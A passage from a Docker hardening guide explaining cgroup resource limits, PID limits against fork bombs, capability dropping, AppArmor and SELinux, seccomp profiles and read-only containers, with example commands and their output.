    <p>In order to disable user namespace mapping on a per container basis once enabled for the Docker daemon, you could supply the <code>--userns=host</code> value to either of the <code>run</code>, <code>exec</code> or <code>create</code> Docker commands. This would mean the default user within the container was mapped to the hosts root.</p>
  </li>
</ol>

<h6 id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups">
  <a href="http://man7.org/linux/man-pages/man7/cgroups.7.html">Control Groups</a>
</h6>

<p>Use cgroups to limit, track and monitor the resources available to each container at each nested level. Docker makes applying resource constraints very easy. Check the <a href="https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources">Runtime constraints on resources</a> Docker engine run reference documentation, which covers applying constraints such as:</p>

<ul>
  <li>User memory</li>
  <li>Kernel memory</li>
  <li>Swappiness</li>
  <li>CPU share</li>
  <li>CPU period</li>
  <li>Cpuset</li>
  <li>CPU quota</li>
  <li>Block IO bandwidth (Blkio)</li>
</ul>

<p>For additional details on setting these types of resource limits, also refer to the <a href="https://docs.docker.com/engine/admin/resource_constraints/">Limit a containers resources</a> Admin Guide for Docker Engine. Basically when you <code>run</code> a container, you simply provide any number of the runtime configuration flags that control the underlying cgroup system resources. Cgroup resources can not be set if a process is not running, that is why we optionally pass the flag(s) at run-time or alternatively manually change the cgroup settings once a process (or Docker container in our case) is running. We can make manual changes on the fly by directly modifying the cgroup resource files. These files are stored in the containers cgroup directories shown in the output of the <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup"><code>/sys/fs/cgroup   find -name "4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24"</code></a> command below. These files are ephemeral for the life of the process (Docker container in our case).</p>

<p>By <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#options-for-the-runtime">default</a> Docker uses the cgroupfs cgroup driver to interface with the Linux kernels cgroups. You can see this by running <code>docker info</code>. The Linux kernels cgroup interface is provided through the cgroupfs pseudo-filesystem <code>/sys/fs/cgroup</code> on the host filesystem of recent Linux distributions. The <code>/proc/cgroups</code> file contains the information about the systems controllers compiled into the kernel. This file on my test system looks like the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1">#subsys_name    hierarchy       num_cgroups     enabled</code>
cpuset          <code class="m">4</code>               <code class="m">9</code>               <code class="m">1</code>
cpu             <code class="m">5</code>               <code class="m">106</code>             <code class="m">1</code>
cpuacct         <code class="m">5</code>               <code class="m">106</code>             <code class="m">1</code>
blkio           <code class="m">11</code>              <code class="m">105</code>             <code class="m">1</code>
memory          <code class="m">6</code>               <code class="m">170</code>             <code class="m">1</code>
devices         <code class="m">8</code>               <code class="m">105</code>             <code class="m">1</code>
freezer         <code class="m">3</code>               <code class="m">9</code>               <code class="m">1</code>
net_cls         <code class="m">7</code>               <code class="m">9</code>               <code class="m">1</code>
perf_event      <code class="m">2</code>               <code class="m">9</code>               <code class="m">1</code>
net_prio        <code class="m">7</code>               <code class="m">9</code>               <code class="m">1</code>
hugetlb         <code class="m">9</code>               <code class="m">9</code>               <code class="m">1</code>
pids            <code class="m">10</code>              <code class="m">110</code>             <code class="m">1</code>
</pre></div>

</figure>

<p>The fields represent the following:</p>

<ul>
  <li>
<code>subsys_name</code>: The name of the controller</li>
  <li>
<code>hierarchy</code>: Unique Id of the cgroup hierarchy</li>
  <li>
<code>num_cgroups</code>: The number of cgroups in the specific hierarchy using this controller</li>
  <li>
<code>enabled</code>: 1 == enabled, 0 == disabled </li>
</ul>

<p>If you run a container like the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -it --rm --name<code class="o">=</code>cgroup-test ubuntu
root@4f1f200ce13f:/# 
</pre></div>

</figure>

<p>Cgroups for your containers and the system resources controlled by them will be stored as follows:</p>

<figure class="code" id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup">
  <figcaption>/sys/fs/cgroup pseudo-filesystem</figcaption>

<div class="highlight"><pre><code></code>/sys/fs/cgroup   find -name <code class="s2">"4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24"</code>
./blkio/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./pids/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./hugetlb/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./devices/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./net_cls,net_prio/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./memory/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./cpu,cpuacct/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./cpuset/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./freezer/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./perf_event/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
./systemd/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/sys/fs/cgro<code class="se">\</code>
up<code class="sb">`</code> pseudo-filesystem
</pre></div>

</figure>

<p>Docker also keeps track of the cgroups in<br />
<code>/sys/fs/cgroup/[resource]/docker/[containerId]</code><br />
You will notice that Docker creates cgroups using the container Id.</p>

<p>If you want to manually create a cgroup and have your containers hierarchically nested within it, you just need to <code>mkdir</code> within:<br />
<code>/sys/fs/cgroup/</code><br />
you will probably need to be root for this.</p>

<figure class="code">
<div class="highlight"><pre><code></code>/sys/fs/cgroup mkdir cg1
</pre></div>

</figure>

<p>Which makes and populates the directory and also sets up the cgroup like the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code>/sys/fs/cgroup   find -name <code class="s2">"cg1"</code>
./cg1
./blkio/system.slice/docker.service/cg1
./pids/system.slice/docker.service/cg1
./hugetlb/cg1
./devices/system.slice/docker.service/cg1
./net_cls,net_prio/cg1
./memory/system.slice/docker.service/cg1
./cpu,cpuacct/system.slice/docker.service/cg1
./cpuset/cg1
./freezer/
./perf_event/cg1
./systemd/system.slice/docker.service/cg1
</pre></div>

</figure>

<p>Now you can run a container with <code>cg1</code> as your cgroup parent:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -it --rm --cgroup-parent<code class="o">=</code>cg1 --name<code class="o">=</code>cgroup-test1 ubuntu
root@810095d51702:/#
</pre></div>

</figure>

<p>Now that Docker has your container named <code>cgroup-test1</code> running, you will be able to see the nested cgroups:</p>

<figure class="code">
<div class="highlight"><pre><code></code>/sys/fs/cgroup   find -name <code class="s2">"810095d51702*"</code>
./blkio/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90<code class="se">\</code>
961ee528903
./pids/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b909<code class="se">\</code>
61ee528903
./hugetlb/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
./devices/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b<code class="se">\</code>
90961ee528903
./net_cls,net_prio/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
./memory/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b9<code class="se">\</code>
0961ee528903
./cpu,cpuacct/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883<code class="se">\</code>
306b90961ee528903
./cpuset/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
./freezer/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
./perf_event/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
./systemd/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b<code class="se">\</code>
90961ee528903
</pre></div>

</figure>

<p>You can also run containers nested below already running containers cgroups, let us take the container named <code>cgroup-test</code> for example:</p>

<figure class="code">
<div class="highlight"><pre><code></code>/sys/fs/cgroup/cpu/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
</pre></div>

</figure>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -it --rm --cgroup-parent<code class="o">=</code>4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e55<code class="se">\</code>
1f4eb24 --name<code class="o">=</code>cgroup-test2 ubuntu
root@93cb84d30291:/#
</pre></div>

</figure>

<p>Now your new container named <code>cgroup-test2</code> will have a set of nested cgroups within each of the:<br />
<code>93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270</code><br />
directories shown here:</p>

<figure class="code">
<div class="highlight"><pre><code></code>/sys/fs/cgroup   find -name <code class="s2">"93cb84d30291*"</code>
./blkio/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e55<code class="se">\</code>
1f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./pids/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551<code class="se">\</code>
f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./hugetlb/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84<code class="se">\</code>
d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./devices/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e<code class="se">\</code>
551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./net_cls,net_prio/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30<code class="se">\</code>
291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./memory/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e5<code class="se">\</code>
51f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./cpu,cpuacct/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5<code class="se">\</code>
ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./cpuset/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d<code class="se">\</code>
5676545015220696dbcc72a65a12a0c96cda01dd1d270
./freezer/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84<code class="se">\</code>
d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./perf_event/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201<code class="se">\</code>
a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
./systemd/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e<code class="se">\</code>
551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
</pre></div>

</figure>

<p>You should see the same result if you have a look in the running containers<br />
<code>/proc/self/cgroup</code> file.</p>

<p>Within each cgroup resides a collection of files specific to the controlled resource, some of which are used to limit aspects of the resource, some of which are used for monitoring aspects of the resource. They should be fairly obvious what they are, based on their names. You can not exceed the resource limits of the cgroup that your cgroup is nested within. There are ways in which you can get visibility into any containers resource usage. One quick and simple way is with the:<br />
<a href="https://docs.docker.com/engine/reference/commandline/stats/"><code>docker stats</code></a><code> [containerId]</code><br />
command, which will give you a line with your containers CPU usage, Memory usage and Limit, Net I/O, Block I/O, Number of PIDs. There are so many other sources of container resource usage. Check the <a href="https://docs.docker.com/engine/admin/runmetrics/">Docker engine runtime metrics</a> documentation for additional details.</p>

<p>The most granular information can be found in the statistical files within the cgroup directories listed above.<br />
The <code>/proc/[pid]/cgroup</code> file provides a description of the cgroups that the process with the specified PID belongs to. You can see this in the following <code>cat</code> output. The information provided is different for cgroups version 1 and version 2 hierarchies, for this example, we are focussing on version 1. Docker abstracts all of this anyway, so it is just to show you how things hang together:</p>

<figure class="code">
<div class="highlight"><pre><code></code>cat /proc/<code class="sb">`</code>docker inspect -f <code class="s1">'{{ .State.Pid }}'</code> cgroup-test2<code class="sb">`</code>/cgroup
<code class="m">11</code>:blkio:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e<code class="se">\</code>
551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">10</code>:pids:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e5<code class="se">\</code>
51f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">9</code>:hugetlb:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a8<code class="se">\</code>
4d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">8</code>:devices:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1<code class="se">\</code>
e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">7</code>:net_cls,net_prio:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d3<code class="se">\</code>
0291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">6</code>:memory:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e<code class="se">\</code>
551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">5</code>:cpu,cpuacct:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b<code class="se">\</code>
5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">4</code>:cpuset:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84<code class="se">\</code>
d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">3</code>:freezer:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a8<code class="se">\</code>
4d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">2</code>:perf_event:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d3029120<code class="se">\</code>
1a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
<code class="m">1</code>:name<code class="o">=</code>systemd:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7<code class="se">\</code>
b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
</pre></div>

</figure>

<p>Each row of the above file depicts one of the cgroup hierarchies that the process, or Docker container in our case is a member of. The row consists of three fields separated by colon, in the form:<br />
<code>hierarchy-Id:list-of-controllers-bound-to-hierarchy:cgroup-path</code><br />
If you remember back to where we looked at the <code>/proc/cgroups</code> file above, you will notice that the:</p>

<ol class="numeric">
  <li>hierarchy unique Id is represented here as the <code>hierarchy-Id</code>
</li>
  <li>subsys_name is represented here in the comma separated list-of-controllers-bound-to-hierarchy</li>
  <li>Unrelated to <code>/proc/cgroups</code>, the third field contains relative to the mount point of the hierarchy the pathname of the cgroup in the hierarchy to which the process belongs. You can see this reflected with the<br />
<code>/sys/fs/cgroup   find -name "93cb84d30291*"</code><br />
from above</li>
</ol>

<p><strong>Fork Bomb from Container</strong>  </p>

<p>With a little help from the <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">CIS Docker Benchmark</a> we can use the <code>PID</code>s cgroup limit:</p>

<p>Run the containers with <code>--pids-limit</code> (kernel version 4.3+) and set a sensible value for maximum number of processes that the container can run, based on what the container is expected to be doing. By default the PidsLimit value displayed with the following command will be 0. 0 or -1 means that any number of processes can be forked within the container:</p>

<figure class="code">
  <figcaption>Query</figcaption>

<div class="highlight"><pre><code></code>docker inspect -f <code class="s1">'{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}'</code> cgroup-test2
</pre></div>

</figure>

<figure class="code">
  <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code>93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270: <code class="nv">PidsLimit</code><code class="o">=</code><code class="m">0</code>
</pre></div>

</figure>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -it --pids-limit<code class="o">=</code><code class="m">50</code> --rm --cgroup-parent<code class="o">=</code>4f1f200ce13f2a7a180730f964c6c56d25218d6dd<code class="se">\</code>
40b027c7b5ee1e551f4eb24 --name<code class="o">=</code>cgroup-test2 ubuntu
root@a26c39377af9:/# 
</pre></div>

</figure>

<figure class="code">
  <figcaption>Query</figcaption>

<div class="highlight"><pre><code></code>docker inspect -f <code class="s1">'{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}'</code> 
</pre></div>

</figure>

<figure class="code">
  <figcaption>Result</figcaption>

<div class="highlight"><pre><code></code>cgroup-test2 a26c39377af9ce6554a1b6a8bffb2043c2c5326455d64c2c8a8cfe53b30b7234: <code class="nv">PidsLimit</code><code class="o">=</code><code class="m">50</code>
</pre></div>

</figure>

<h6 id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-capabilities">Capabilities</h6>

<p>There are several ways you can <a href="http://rhelblog.redhat.com/2016/10/17/secure-your-containers-with-this-one-weird-trick/">minimise your set of capabilities</a> that the root user of the container will run. <code>pscap</code> is a useful command from the <code>libcap-ng-utils</code> package in Debian and some other distributions. Once installed you can check which capabilities your container built from the <code>&lt;amazing&gt;</code> image runs with, by:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -d &lt;amazing&gt; sleep <code class="m">5</code> &gt;/dev/null<code class="p">;</code> pscap <code class="p">|</code> grep sleep
<code class="c1"># This will show which capabilities sleep within container is running as.</code>
<code class="c1"># By default, it will be the list shown in the Identify Risks section.</code>
</pre></div>

</figure>

<p>In order to drop capabilities <code>setfcap</code>, <code>audit_write</code>, and <code>mknod</code>, you could run:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -d --cap-drop<code class="o">=</code>setfcap --cap-drop<code class="o">=</code>audit_write --cap-drop<code class="o">=</code>mknod &lt;amazing&gt; sleep <code class="m">5</code> &gt; <code class="se">\</code>
/dev/null<code class="p">;</code> pscap <code class="p">|</code> grep sleep
<code class="c1"># This will show that sleep within the container no longer has enabled:</code>
<code class="c1"># setfcap, audit_write, or mknod</code>
</pre></div>

</figure>

<p>Or just drop all capabilities and only add what you need:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -d --cap-drop<code class="o">=</code>all --cap-add<code class="o">=</code>audit_write --cap-add<code class="o">=</code><code class="nb">kill</code> --cap-add<code class="o">=</code>setgid --cap-add<code class="o">=</code><code class="se">\</code>
setuid &lt;amazing&gt; sleep <code class="m">5</code> &gt; /dev/null<code class="p">;</code> pscap <code class="p">|</code> grep sleep
<code class="c1"># This will show that sleep within the container is only running with</code>
<code class="c1"># audit_write, kill, setgid and setuid.</code>
</pre></div>

</figure>

<p>Another way of auditing the capabilities of your container is with the following command from <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">CIS Docker Benchmark</a>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker ps --quiet <code class="p">|</code> xargs docker inspect --format <code class="s1">'{{ .Id }}: CapAdd={{ .HostConfig.CapAdd }}\</code>
<code class="s1"> CapDrop={{ .HostConfig.CapDrop }}'</code>
</pre></div>

</figure>

<p>Alternatively you can modify the container manifest directly. See the <a href="chap03.html#vps-countermeasures-docker-runc-and-where-it-fits-in">runC section</a> for this.</p>

<h6 id="leanpub-auto-linux-security-modules-lsm">Linux Security Modules (LSM)</h6>

<p>Linux Security Modules (LSM) is a framework that has been part of the Linux kernel since 2.6, that supports security models implementing Mandatory Access Control (MAC). The currently accepted modules are AppArmor, SELinux, Smack and TOMOYO Linux.</p>

<p>At the <a href="https://lwn.net/2001/features/KernelSummit/">first Linux kernel summit</a> in 2001, <em>Peter Loscocco from the National Security Agency (NSA) presented the design of the mandatory access control system in its SE Linux distribution.</em> SE Linux had implemented: Many check points where authorization to perform a particular task was controlled, and a security manager process which implements the actual authorization policy. <em>The separation of the checks and the policy mechanism is an important aspect of the system - different sites can implement very different access policies using the same system.</em> The aim of this separation is to make it harder for the user to not adjust or override policies.</p>

<p>It was realised that there were several security related projects trying to solve the same problem. It was decided to <a href="http://www.hep.by/gnu/kernel/lsm/">have the developers</a> interested in security <a href="https://lwn.net/Articles/180194/">create a</a> <em>generic interface which could be used by any security policy. The result was the Linux Security Modules (LSM)</em> API/framework, which provides many hooks at <a href="https://www.linux.com/learn/overview-linux-kernel-security-features">security critical points</a> within the kernel.</p>


<figure class="image center" style="width: 396px;">
  <img src="images/LSMFrameworkDesign.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>LSMs can register with the API and receive callbacks from these hooks when the Unix Discretionary Access Control (DAC) checks succeed, allowing the LSMs Mandatory Access Control (MAC) code to run. The LSMs are not loadable kernel modules, but instead <a href="https://www.kernel.org/doc/Documentation/security/LSM.txt">selectable at build-time</a> via <code>CONFIG_DEFAULT_SECURITY</code> which takes a comma separated list of LSM names. Commonly multiple LSMs are built into a given kernel and can be overridden at boot-time via the <a href="https://debian-handbook.info/browse/stable/sect.selinux.html#sect.selinux-setup"><code>security=...</code> kernel command line argument</a>, also taking a comma separated list of LSM names.</p>

<p>If no specific LSMs are built into the kernel, the default LSM will be the <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-capabilities">Linux capabilities</a>. <em>Most LSMs choose to <a href="https://www.kernel.org/doc/Documentation/security/LSM.txt">extend the capabilities</a> system, building their checks on top of the defined capability hooks.</em> A comma separated list of the active security modules can be found in <code>/sys/kernel/security/lsm</code>. The list reflects the order in which checks are made, the capability module will always be present and be the first in the list.</p>

<p>
  <strong>AppArmor LSM in Docker</strong>
</p>

<p>If you intend to use <a href="http://wiki.apparmor.net/index.php/QuickProfileLanguage">AppArmor</a>, make sure it is installed, and you have a policy loaded (<code>apparmor_parser -r [/path/to/your_policy]</code>) and enforced (<code>aa-enforce</code>).
AppArmor policys are created using the <a href="http://wiki.apparmor.net/index.php/ProfileLanguage">profile language</a>. Docker will automatically generate and load a default AppArmor policy <code>docker-default</code> when you run a container. If you want to override the policy, you do this with the <code>--security-opt</code> flag, like:<br />
<code>docker run --security-opt apparmor=your_policy [container-name]</code><br />
providing your policy is loaded as mentioned above. There are further details available on the <a href="https://docs.docker.com/engine/security/apparmor/">apparmor page</a> of Dockers Secure Engine.</p>

<p>
  <strong>SELinux LSM in Docker</strong>
</p>

<p>Red Hat, Fedora, and some other distributions ship with SELinux policies for Docker. Many other distros such as Debian require an install. SELinux needs to be <a href="https://wiki.debian.org/SELinux/Setup">installed and configured</a> on Debian.</p>

<p>SELinux support for the Docker daemon is <a href="https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines">disabled by default</a> and needs to be <a href="https://docs.docker.com/engine/reference/commandline/dockerd/">enabled</a> with the following command:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1">#Start the Docker daemon with:</code>
dockerd --selinux-enabled
</pre></div>

</figure>

<p>Docker daemon options can also be set within the daemon <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-configuration-file">configuration file</a><br />
<code>/etc/docker/daemon.json</code><br />
by default or by specifying an alternative location with the <code>--config-file</code> flag.</p>

<p>label confinement for the container can be configured using <a href="https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines"><code>--security-opt</code></a> to load SELinux or AppArmor policies as shown in the Docker <code>run</code> example below:</p>

<p><a href="https://www.projectatomic.io/docs/docker-and-selinux/">SELinux Labels for Docker</a> consist of four parts:</p>

<figure class="code">
  <figcaption>Syntax</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># Set the label user for the container.</code>
--security-opt<code class="o">=</code><code class="s2">"label:user:USER"</code>
<code class="c1"># Set the label role for the container.</code>
--security-opt<code class="o">=</code><code class="s2">"label:role:ROLE"</code>
<code class="c1"># Set the label type for the container.</code>
--security-opt<code class="o">=</code><code class="s2">"label:type:TYPE"</code>
<code class="c1"># Set the label level for the container.</code>
--security-opt<code class="o">=</code><code class="s2">"label:level:LEVEL"</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>Example</figcaption>

<div class="highlight"><pre><code></code>docker run -it --security-opt <code class="nv">label</code><code class="o">=</code>level:s0:c100,c200 ubuntu
</pre></div>

</figure>

<p>SELinux can be enabled in the container using <a href="http://www.unix.com/man-page/debian/8/setenforce/"><code>setenforce 1</code></a>.</p>

<p>SELinux can operate in <a href="https://www.centos.org/docs/5/html/5.2/Deployment_Guide/sec-sel-enable-disable-enforcement.html">one of three modes</a>:</p>

<ol class="numeric">
  <li>
<code>disabled</code>: not enabled in the kernel</li>
  <li>
<code>permissive</code> or <code>0</code>: SELinux is running and logging, but not controlling/enforcing permissions</li>
  <li>
<code>enforcing</code> or <code>1</code>: SELinux is running and enforcing policy</li>
</ol>

<p>To change at run-time: Use the <code>setenforce [0|1]</code> command to change between <code>permissive</code> and <code>enforcing</code>. Test this, set to <code>enforcing</code> before persisting it at boot.<br />
To persist on boot: <a href="https://debian-handbook.info/browse/stable/sect.selinux.html#sect.selinux-setup">In Debian</a>, set <code>enforcing=1</code> in the kernel command line<br />
<code>GRUB_CMDLINE_LINUX</code> in <code>/etc/default/grub</code><br />
and run <code>update-grub</code><br />
SELinux will be enforcing after a reboot.</p>

<p>To audit what LSM options you currently have applied to your containers, run the following command from the <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">CIS Docker Benchmark</a>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker ps --quiet --all <code class="p">|</code> xargs docker inspect --format <code class="s1">'{{ .Id }}: SecurityOpt={{ .HostConfi\</code>
<code class="s1">g.SecurityOpt }}'</code>
</pre></div>

</figure>

<h6 id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-seccomp">Seccomp</h6>

<p>First you need to make sure your Docker instance was built with Seccomp. Using the recommended command from the CIS Docker Benchmark:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker ps --quiet <code class="p">|</code> xargs docker inspect --format <code class="s1">'{{ .Id }}: SecurityOpt={{ .HostConfig.Secu\</code>
<code class="s1">rityOpt }}'</code>
<code class="c1"># Should return without a value, or your modified seccomp profile, discussed soon.</code>
<code class="c1"># If [seccomp:unconfined] is returned, it means the container is running with</code>
<code class="c1"># no restrictions on System calls.</code>
<code class="c1"># Which means the container is running without any seccomp profile.</code>
</pre></div>

</figure>

<p>and your kernel is <a href="https://docs.docker.com/engine/security/seccomp/">configured with <code>CONFIG_SECCOMP</code></a>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>cat /boot/config-<code class="sb">`</code>uname -r<code class="sb">`</code> <code class="p">|</code> grep <code class="nv">CONFIG_SECCOMP</code><code class="o">=</code>
<code class="c1"># Should return the following if it is:</code>
<code class="nv">CONFIG_SECCOMP</code><code class="o">=</code>y
</pre></div>

</figure>

<p>To add System calls to the list of syscalls you want to block for your container, take a copy of the default seccomp profile for containers (<a href="https://github.com/docker/docker/blob/master/profiles/seccomp/default.json"><code>default.json</code></a>) which contains a whitelist of the allowed System calls, and remove the System calls you want blocked, then run your container with the <code>--security-opt</code> option to override the default profile with a copy that you have modified: </p>

<figure class="code">
<div class="highlight"><pre><code></code>docker run --rm -it --security-opt <code class="nv">seccomp</code><code class="o">=</code>/path/to/seccomp/profile.json hello-world
</pre></div>

</figure>

<h6 id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers">Read-only Containers</h6>

<p>Running a container with the <code>--read-only</code> flag stops writes to the container.</p>

<p>This can sometimes be a little to constraining, as your application may need to write some temporary data locally. You could volume mount a host directory into your container, but this would obviously expose that temporary data to the host, and also other containers that may mount the same host directory. To stop other containers sharing your mounted volume, you would have to employ <a href="chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces-mnt-labelling">labelling</a> with the likes of LSM and apply the <code>Z</code> suffix at volume mount time.</p>

<p>A better, easier and simpler solution would be to apply the <a href="https://docs.docker.com/engine/reference/commandline/run/#mount-tmpfs---tmpfs"><code>--tmpfs</code></a> flag to one or more directories. <code>--tmpfs</code> allows the setting up of tmpfs (appearing as a mounted file system, but stored in volatile memory) mounts on any local directory, solving the problem of not being able to write at all to read-only containers.</p>

<p>If an existing directory is specified with the <code>--tmpfs</code> option, you will experience similar behaviour to that of mounting an empty directory onto an existing one. The directory is initially empty, any additions or modifications to the directories contents will not persist past container stop.</p>

<p>The following is an example of running a container as read-only with a writeable tmpfs <code>/tmp</code> directory:</p>

<figure class="code">
<div class="highlight"><pre><code></code>docker run -it --rm --read-only --tmpfs /tmp --name<code class="o">=</code>my-read-only-container ubuntu
</pre></div>

</figure>

<p>The default mount flags with <code>--tmpfs</code> are the same as the Linux default <code>mount</code> flags, if you do not specify any <code>mount</code> flags the following will be used:<br />
